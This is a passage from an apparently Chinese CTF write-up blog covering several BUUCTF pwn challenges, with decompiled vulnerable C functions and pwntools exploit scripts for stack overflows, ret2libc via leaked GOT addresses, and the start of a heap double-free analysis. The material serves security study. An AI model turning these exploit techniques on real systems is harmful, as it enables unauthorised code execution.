class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *v9; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先输入密码为administrator，然后进入菜单。</p><p>问题出在GetFlag里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">GetFlag</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为有fflush，其中的字符串sh可以代替/bin/sh</p><blockquote><p>   ROPgadget  –binary ciscn_2019_ne_5  –string “sh”</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote()</span></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+ p32(sys_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(sh_addr)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">&quot;administrator&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x14-铁人三项-第五赛区-2018-rop"><a href="#0x14-铁人三项-第五赛区-2018-rop" class="headerlink" title="0x14.铁人三项(第五赛区)_2018_rop"></a>0x14.铁人三项(第五赛区)_2018_rop</h2><p>buf那里可以覆盖。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leak read或者write函数地址都OK。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./2018_rop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26602</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main = <span class="number">0x80484C6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_add = u32(io.recv())</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_add)</span><br><span class="line">base = read_add - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_add = base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = base +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys_add)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x14-others-shellcode"><a href="#0x14-others-shellcode" class="headerlink" title="0x14.others_shellcode"></a>0x14.others_shellcode</h2><p>就，，完全不知道这题想表达啥，可能就是想讲一下系统调用吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00000550 getShell        proc near               ; CODE XREF: main+D↓p</span><br><span class="line">.text:00000550 ; __unwind &#123;</span><br><span class="line">.text:00000550                 push    ebp</span><br><span class="line">.text:00000551                 mov     ebp, esp</span><br><span class="line">.text:00000553                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:00000558                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:0000055D                 xor     edx, edx        ; envp</span><br><span class="line">.text:0000055F                 push    edx</span><br><span class="line">.text:00000560                 push    68732F2Fh</span><br><span class="line">.text:00000565                 push    6E69622Fh</span><br><span class="line">.text:0000056A                 mov     ebx, esp        ; file</span><br><span class="line">.text:0000056C                 push    edx</span><br><span class="line">.text:0000056D                 push    ebx</span><br><span class="line">.text:0000056E                 mov     ecx, esp        ; argv</span><br><span class="line">.text:00000570                 mov     eax, 0FFFFFFFFh</span><br><span class="line">.text:00000575                 sub     eax, 0FFFFFFF4h</span><br><span class="line">.text:00000578                 int     80h             ; LINUX - sys_execve</span><br><span class="line">.text:0000057A                 nop</span><br><span class="line">.text:0000057B                 pop     ebp</span><br><span class="line">.text:0000057C                 retn</span><br><span class="line">.text:0000057C ; &#125; // starts at 550</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27311</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x15-bjdctf-2020-babyrop"><a href="#0x15-bjdctf-2020-babyrop" class="headerlink" title="0x15.bjdctf_2020_babyrop"></a>0x15.bjdctf_2020_babyrop</h2><p>一上来是两个puts，然后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>足够长，可以覆盖。</p><p>没有用LibcSearcher，一直说找不到，，，下了buu的libc好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27222</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_babyrop&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-x64-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000400733</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_add = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">base = puts_add - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi_ret) +p64(bin_sh)+p64(sys_add)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x16-babyheap-0ctf-2017"><a href="#0x16-babyheap-0ctf-2017" class="headerlink" title="0x16.babyheap_0ctf_2017"></a>0x16.babyheap_0ctf_2017</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">程序有4个功能：</span><br><span class="line">Allocate：calloc分配内存，并给出相应的index</span><br><span class="line">FIll：输入index，并分配内存，并填充</span><br><span class="line">Free：释放输入index的内存</span><br><span class="line">Dump：选择index并输出</span><br></pre></td></tr></table></figure><p>首先是Allocate：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_D48</span><span class="params">(__int64 a1)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]  </span></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]  </span></span><br><span class="line">    <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]  </span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )  </span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )    </span><br><span class="line">        &#123;      </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);      </span><br><span class="line">            v2 = sub_138C();      </span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )      </span><br><span class="line">            &#123;        </span><br><span class="line">                <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )          </span><br><span class="line">                    v2 = <span class="number">4096</span>;        </span><br><span class="line">                v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);        </span><br><span class="line">                <span class="keyword">if</span> ( !v3 )          </span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);        </span><br><span class="line">                *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;        </span><br><span class="line">                *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;        </span><br><span class="line">                *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;        </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);      </span><br><span class="line">            &#125;      </span><br><span class="line">            <span class="keyword">return</span>;    </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>   其中限制了大小，不能超过4096字节；</p><p>   *(24LL * i + a1)为1表示chunk已经创建</p><p>   *(a1 + 24LL * i + 8)：存放chunk的大小</p><p>   *(a1 + 24LL * i + 16)：chunk的地址</p></blockquote><p>Fill函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E7F</span><span class="params">(__int64 a1)</span></span>&#123;  </span><br><span class="line">    __int64 result; <span class="comment">// rax  </span></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]  </span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);  </span><br><span class="line">    result = sub_138C();  </span><br><span class="line">    v2 = result;  </span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )  </span><br><span class="line">    &#123;    </span><br><span class="line">        result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);    <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )    </span><br><span class="line">            &#123;      </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);      </span><br><span class="line">                result = sub_138C();      </span><br><span class="line">                v3 = result;      </span><br><span class="line">                <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )      </span><br><span class="line">                &#123;        </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);        </span><br><span class="line">                    result = sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);      </span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  先判断对应的位置是否为1，即chunk是否创建</p><p>  然后将v3长度的内容写到*(24LL * v2 + a1 + 16)的地址中</p></blockquote><p>Free函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_F50</span><span class="params">(__int64 a1)</span></span>&#123;  </span><br><span class="line">    __int64 result; <span class="comment">// rax  </span></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h] </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);  </span><br><span class="line">    result = sub_138C();  </span><br><span class="line">    v2 = result; </span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> ) </span><br><span class="line">    &#123;   </span><br><span class="line">        result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);  </span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )   </span><br><span class="line">        &#123;   </span><br><span class="line">            *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;     </span><br><span class="line">         *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;   </span><br><span class="line">            <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));   </span><br><span class="line">            result = <span class="number">24LL</span> * v2 + a1;    </span><br><span class="line">            *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  输入index，如果对应的位置是1：</p><p>  置0，将记录chunk大小的位置标记为0，释放指针*(24LL * v2 + a1 + 16)对应的内存</p></blockquote><p>Dump函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_1051</span><span class="params">(__int64 a1)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax  </span></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);  </span><br><span class="line">    result = sub_138C();  </span><br><span class="line">    v2 = result;  </span><br><span class="line">    <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )  </span><br><span class="line">    &#123;    </span><br><span class="line">        result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);    </span><br><span class="line">        <span class="keyword">if</span> ( result == <span class="number">1</span> )   </span><br><span class="line">        &#123;      </span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);     </span><br><span class="line">            sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));      </span><br><span class="line">            result = <span class="built_in">puts</span>(byte_14F1);    </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  输入index，若标志位为1，打印*(24LL * v2 + a1 + 16)位置，长度为*(24LL * v2 + a1 + 8)的内容。</p></blockquote><p>没有uaf，内存free掉后不能查看其中的内容，但是可以double free获得指向small bin的index，释放后通过dump打印出来。</p><p>首先分配一些相同大小的fast chunk ，在分配一个small chunk，释放掉其中的一个fast chunk。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 